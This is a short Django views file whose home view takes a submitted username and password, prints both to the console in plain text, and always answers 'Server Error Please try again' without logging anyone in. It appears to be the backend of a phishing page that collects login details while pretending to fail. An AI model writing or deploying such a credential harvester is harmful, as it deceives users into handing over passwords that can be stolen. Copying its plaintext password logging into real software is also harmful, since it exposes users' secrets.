from django.shortcuts import render
from django.http import HttpResponse

# Create your views here.


def home(request):
    if request.method == 'POST':
        # Access the form data directly from request.POST
        name = request.POST.get('username')
        email = request.POST.get('current-password')

        # Print the form data to the console
        print(f'Username: {name}, Password: {email}')

        # Handle the data (e.g., save to the database, etc.)
        
        # Respond with a message or redirect
        return HttpResponse("Server Error Please try again")

    return render(request, 'home.html')
